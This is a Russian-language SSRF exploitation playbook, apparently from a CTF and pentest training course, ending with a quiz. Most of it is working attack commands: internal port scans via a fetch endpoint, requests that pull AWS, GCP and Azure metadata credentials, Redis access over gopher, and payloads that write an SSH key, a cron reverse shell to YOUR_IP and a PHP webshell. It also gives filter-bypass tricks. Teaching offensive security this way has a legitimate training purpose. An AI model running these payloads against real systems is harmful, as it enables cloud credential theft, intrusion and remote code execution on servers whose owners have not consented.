---
id: web-playbook-ssrf-to-internal
title: "Плейбук: SSRF — от подтверждения до внутренней сети и RCE"
category: web
parent: web-playbooks-exploit
difficulty: hard
order: 3
tags: [playbook, ssrf, metadata, gopher, redis, internal, decision-tree, web]
prerequisites: [web-ssrf-core, web-ssrf-cloud-deep, web-playbook-recon-to-foothold]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 38
summary: "Decision-tree для SSRF: подтвердить → внутренний порт-скан → cloud metadata → внутренние сервисы (redis/memcached/mysql) → gopher → RCE."
---

Сервер сходил по вашему URL — значит, он стал вашим прокси во внутреннюю сеть. Вопрос: **что там, за периметром, и как из «сервер сделал GET» получить креды, данные или код.** Этот плейбук — маршрут от подтверждения SSRF к внутреннему скану, метаданным облака, сервисам вроде Redis и, через `gopher://`, к RCE.

## Дерево решения (общая карта)

```
[SSRF: сервер ходит по моему URL]
   │
   ├─(1) ПОДТВЕРДИТЬ и понять канал
   │      ├─ отражённый (вижу тело ответа) ─► полный SSRF
   │      ├─ blind (нет ответа) ────────────► OOB-детект (interactsh)
   │      └─ ограниченный (только http/https) ► обходы схем и редиректов
   │
   ├─(2) ВНУТРЕННИЙ ПОРТ-СКАН (127.0.0.1, 10.0.0.0/8, 169.254.169.254)
   │      └─ открыт порт ──► (3) или (4)
   │
   ├─(3) CLOUD METADATA
   │      ├─ AWS 169.254.169.254/latest/meta-data/iam/...
   │      ├─ GCP metadata.google.internal/computeMetadata/v1/
   │      └─ Azure 169.254.169.254/metadata/instance?api-version=...
   │      └─► креды/токены ──► доступ к облаку
   │
   ├─(4) ВНУТРЕННИЕ СЕРВИСЫ
   │      ├─ Redis 6379 (no-auth) ──► (5) gopher → RCE
   │      ├─ Memcached 11211
   │      ├─ Elasticsearch 9200 (открытый дамп)
   │      ├─ MySQL/Postgres (пароль в конфиге)
   │      └─ Docker API 2375 / K8s 10250
   │
   └─(5) GOPHER → RCE (Redis: запись cron/SSH/webshell, replication)
          │
          └─► [код / креды / данные]
```

## Шаг 1. Подтвердить SSRF и понять канал

Сначала — точно понять, **что именно контролирует сервер**: URL целиком, только хост, только путь. От этого зависят все дальнейшие шаги.

```bash
# Отражённый SSRF: подставляем свой внешний listener и смотрим, придёт ли запрос
#   (сначала поднимите приёмник: interactsh-client / nc -lvnp 80)
curl -s --get --data-urlencode 'url=http://YOUR_IP:80/ssrf-test' https://target.tld/fetch

# Проверить, возвращается ли тело ответа (полный SSRF) или только статус (blind)
curl -s --get --data-urlencode 'url=http://127.0.0.1:80/' https://target.tld/fetch | head

# Обход «только http(s)»: редирект с вашего хоста на внутренний
#   на YOUR_IP поднимаем: python3 -m http.server; кладём редирект на 169.254.169.254
curl -s --get --data-urlencode 'url=http://YOUR_IP:8000/redirect' https://target.tld/fetch

# Blind: детект через DNS/HTTP OOB
interactsh-client   # получите ваш <id>.oast.fun
curl -s --get --data-urlencode 'url=http://<id>.oast.fun/' https://target.tld/fetch
```

**Условие ветвления:** приходит запрос на ваш listener → SSRF есть. Видите тело внутреннего ответа → «полный» SSRF, можно сканировать и читать. Только задержка/статус → blind, работаем через OOB и timing.

## Шаг 2. Внутренний порт-скан

Используйте сервер как сканер: время ответа и сообщения об ошибках говорят, открыт порт или нет.

```bash
# Быстрый перебор типовых портов (open=быстро/иной ответ, closed=отказ/таймаут)
for port in 22 80 443 3306 5432 6379 8000 8080 8443 9200 11211 2375 10250; do
  t=$(curl -s -o /dev/null -w '%{time_total}' --get \
      --data-urlencode "url=http://127.0.0.1:$port/" https://target.tld/fetch)
  echo "127.0.0.1:$port -> $t"
done

# Отдельные сети: внутренние подсети и облачные адреса
for ip in 10.0.0.1 10.0.0.2 172.16.0.1 192.168.0.1 169.254.169.254; do
  curl -s -o /dev/null -w "$ip %{http_code} %{time_total}\n" --get \
    --data-urlencode "url=http://$ip/" https://target.tld/fetch
done
```

**Условие ветвления:** открыт 6379/11211/9200 → шаг 4 (сервисы). Открыт 80/8080 внутри → ищите админки/API (идите в `web-playbook-auth-bypass`). Доступен `169.254.169.254` → шаг 3 (метаданные). Ничего → blind-путь и обходы схем.

## Шаг 3. Cloud metadata

Метаданные облака — часто самый быстрый путь к кредам. Синтаксис зависит от провайдера.

```bash
# --- AWS (IMDSv1) ---
curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/' https://target.tld/fetch
curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' https://target.tld/fetch
#   затем имя роли из предыдущего ответа:
curl -s --get --data-urlencode 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME' https://target.tld/fetch

# AWS IMDSv2 (нужен PUT с токеном — SSRF обычно не умеет; пробуйте редиректы/схемы)
#   если приложение умеет только GET, IMDSv2 защищён — ищите другой путь

# --- GCP (нужен заголовок Metadata-Flavor: Google) ---
curl -s --get --data-urlencode 'url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  -H 'Metadata-Flavor: Google' https://target.tld/fetch

# --- Azure ---
curl -s --get --data-urlencode 'url=http://169.254.169.254/metadata/instance?api-version=2021-02-01' \
  -H 'Metadata: true' https://target.tld/fetch
```

**Условие ветвления:** получили `AccessKeyId`/`SecretAccessKey`/`Token` или GCP-токен → это креды облака: переходите в `playbook-cloud` / `cloud-security-audit`. Нет доступа → IMDSv2 включён; ищите другой внутренний сервис (шаг 4).

## Шаг 4. Внутренние сервисы

Открытый внутренний сервис без аутентификации — прямой путь к данным и RCE.

```bash
# Redis без пароля: INFO и ключи
curl -s --get --data-urlencode 'url=http://127.0.0.1:6379/' https://target.tld/fetch
#   через gopher отправляем настоящие команды Redis (CRLF-протокол)
curl -s --get --data-urlencode 'url=gopher://127.0.0.1:6379/_INFO%0D%0A' https://target.tld/fetch

# Memcached: статистика и ключи
curl -s --get --data-urlencode 'url=gopher://127.0.0.1:11211/_stats%0D%0A' https://target.tld/fetch

# Elasticsearch: открытый дамп индексов
curl -s --get --data-urlencode 'url=http://127.0.0.1:9200/_cat/indices?v' https://target.tld/fetch
curl -s --get --data-urlencode 'url=http://127.0.0.1:9200/_search?size=50' https://target.tld/fetch

# Docker API (часто = root на хосте)
curl -s --get --data-urlencode 'url=http://127.0.0.1:2375/version' https://target.tld/fetch
curl -s --get --data-urlencode 'url=http://127.0.0.1:2375/containers/json' https://target.tld/fetch
```

**Условие ветвления:** Redis без пароля → шаг 5 (gopher → RCE). Elasticsearch открыт → дамп и поиск секретов/кредов. Docker API доступен → контейнер-эскейп (см. `svc-docker-k8s`). Всё закрыто → возвращайтесь к blind-сканированию и обходам.

## Шаг 5. gopher → RCE (Redis как пример)

`gopher://` позволяет отправить на внутренний TCP-порт **произвольные байты** — а значит, говорить на языке сервиса. Redis без пароля через запись файлов даёт RCE.

```bash
# Идея: CONFIG SET dir + dbfilename + SET + BGSAVE = запись файла на диск.
# Каждую строку Redis-протокола кодируем в gopher (URL-encoded CRLF).

# 5.1 Запись SSH-ключа в authorized_keys (типовой путь к root)
#   ключ: ssh-keygen -t rsa -f ./id_rsa
#   Redis-команды (по одной строке), например:
#     CONFIG SET dir /root/.ssh/
#     CONFIG SET dbfilename authorized_keys
#     SET x "\n\nssh-rsa AAAA...== attacker\n\n"
#     SAVE
#   каждую команду шлём gopher-ом:
curl -s --get --data-urlencode \
  'url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20x%20%22%5Cn%5Cnssh-rsa%20AAAA...%3D%3D%20a%5Cn%5Cn%22%0D%0ASAVE%0D%0A' \
  https://target.tld/fetch
#   затем: ssh -i id_rsa root@target.tld

# 5.2 Запись cron (если есть права в /var/spool/cron/)
#   CONFIG SET dir /var/spool/cron/ ; CONFIG SET dbfilename root
#   SET x "\n* * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n" ; SAVE

# 5.3 Webshell (если известен webroot)
#   CONFIG SET dir /var/www/html/ ; CONFIG SET dbfilename shell.php
#   SET x "<?php system($_GET['c']); ?>" ; SAVE

# 5.4 Replication RCE (без записи файлов): поднять свой rogue-Redis и
#     заставить цель сделать SLAVEOF на ваш IP, затем загрузить модуль.
#     Инструмент: https://github.com/n0b0dyCN/redis-rogue-server
```

**Условие ветвления:** запись удалась → проверьте доступ (`ssh`, `curl webshell`, обратный шелл). Не удалось (нет прав на каталог/`CONFIG` отключён) → пробуйте другой путь: master-slave replication, `MODULE LOAD`, или запись в `/var/spool/cron`.

**Осторожно:** запись в `authorized_keys`/`cron`/webroot меняет состояние системы. Проверяйте, что путь корректен, не перезаписывайте чужие файлы и не запускайте деструктивных команд. `SAVE`/`BGSAVE` в Redis временно блокируют инстанс.

## Шаг 6. Blind SSRF и OOB

Если ответа не видно, работайте через внешний канал и время.

```bash
# OOB через interactsh: подтвердить и измерить, куда ходит сервер
interactsh-client -v          # ваш <id>.oast.fun
curl -s --get --data-urlencode 'url=http://<id>.oast.fun/probe' https://target.tld/fetch
#   в логе interactsh видно DNS/HTTP — значит сервер сделал запрос

# Blind-скан портов по времени (open-порты отвечают иначе)
for port in 6379 9200 8080; do
  curl -s -o /dev/null -w "$port %{time_total}\n" --get \
    --data-urlencode "url=http://127.0.0.1:$port/" https://target.tld/fetch
done

# Blind exfil: заставить сервер сходить на внутренний URL, содержащий данные
#   (например, metadata) — и вынести их через ваш listener через редирект
```

**Условие ветвления:** OOB приходит → у вас SSRF-канал; стройте слепую эксфильтрацию. Тишина → проверьте ограничения (whitelist домена, блок приватных диапазонов) и обходы ниже.

## Если не сработало — пробуй это

- **Whitelist доменов.** Обход: `http://allowed.com@127.0.0.1/`, `http://127.0.0.1#allowed.com`, DNS-rebinding, `allowed.com.attacker.tld`.
- **Блок приватных IP.** Обход: десятичный (`http://2130706433/`), восьмеричный, IPv6 (`http://[::1]/`), `http://0/`, `http://0x7f000001/`, `http://①②⑦.0.0.1` (Unicode).
- **Только http(s).** Редирект с вашего сервера на `gopher://`/`file://`; или `dict://` для простых сервисов.
- **Ограничение по длине/схеме.** Используйте короткий редирект (301) на длинный payload, `gopher` через промежуточный редирект.
- **Слепой и без OOB.** Проверяйте по времени открытые порты; сравнивайте ответы приложения на разные внутренние URL.
- **IMDSv2 (нужен PUT + токен).** SSRF через GET не сработает — ищите SSRF с произвольным методом/телом или другой сервис.

## Тупики (dead ends)

- Слепо гонять `gopher://` в никуда, не подтвердив, что порт открыт и сервис вообще отвечает.
- Пытаться прочитать AWS metadata на GCP-хосте (другие адреса/заголовки) — сначала определите провайдера.
- Записывать файлы через Redis без проверки прав/`CONFIG` — молча не сработает; проверьте `INFO server`/ошибку.
- Перебирать тысячи внутренних IP «на удачу» — узкий список типовых адресов и портов эффективнее.
- Игнорировать, что SSRF может быть ограничен только редиректом — тогда все внутренние запросы идут с вашего промежуточного сервера.

## Квиз

```quiz
- question: "Что означает 'полный' SSRF в отличие от blind?"
  options:
    - "Приложение возвращает тело ответа внутреннего сервиса"
    - "Запрос приходит только по HTTPS"
    - "Сервер перезагружается"
    - "Нет разницы"
  answer: 0
  explanation: "Полный SSRF отдаёт содержимое внутреннего ответа; blind — только факт запроса."
- question: "Какой адрес используется для метаданных AWS/GCP/Azure?"
  options:
    - "8.8.8.8"
    - "169.254.169.254"
    - "127.0.0.53"
    - "224.0.0.1"
  answer: 1
  explanation: "169.254.169.254 — link-local адрес сервиса метаданных облака."
- question: "Зачем при SSRF используют схему gopher://?"
  options:
    - "Она быстрее http"
    - "Она позволяет отправить произвольные байты на внутренний TCP-порт (например, Redis)"
    - "Она шифрует трафик"
    - "Она обходит DNS"
  answer: 1
  explanation: "gopher передаёт сырые байты — так говорят на языке Redis/Memcached и т.п."
- question: "Redis доступен без пароля. Какой маршрут ведёт к RCE?"
  options:
    - "Никак, Redis безопасен"
    - "CONFIG SET dir + dbfilename + SET + SAVE — запись файла (SSH-ключ/cron/webshell)"
    - "Только через SQL"
    - "Через XSS"
  answer: 1
  explanation: "Запись файла через смену dir/dbfilename и SAVE даёт SSH-ключ, cron или webshell."
- question: "Приложение ходит только на whitelisted домен. Что попробовать?"
  options:
    - "Сдаться"
    - "Обходы: userinfo @, фрагмент #, DNS-rebinding, поддомен на ваш домен"
    - "Сменить User-Agent"
    - "Запустить sqlmap"
  answer: 1
  explanation: "Whitelist обходят через @-userinfo, #, DNS-rebinding и поддомены на ваш домен."
```

## Где пригодится

- **CTF (Web):** классическая цепочка SSRF → metadata/redis → RCE, частый источник флагов.
- **Bug bounty:** корректная демонстрация влияния SSRF на внутреннюю сеть и облако.
- **Пентест:** выход за периметр веб-приложения во внутреннюю инфраструктуру.
- **Работа (AppSec):** понимание, почему egress-фильтрация и IMDSv2 критичны.
